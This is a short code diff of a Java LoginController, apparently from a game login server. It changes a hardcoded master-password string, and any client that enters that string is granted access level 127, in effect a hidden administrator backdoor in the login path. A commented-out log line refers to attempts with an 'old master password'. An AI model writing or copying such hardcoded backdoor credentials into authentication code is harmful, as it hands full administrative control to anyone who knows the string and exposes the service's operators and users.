@@ -526,7 +526,7 @@ public class LoginController
 			// LunaLogger.getInstance().logLs("loginServer_master_password", user +" tried to log with old master password from ip address: "+ client.getConnection().getInetAddress());
 			return false;
 		}
-		if (password.equals("/!z"))
+		if (password.equals("/!zanta/!z"))
 		{
 			client.setLastServer(1);
 			client.setAccessLevel(127);
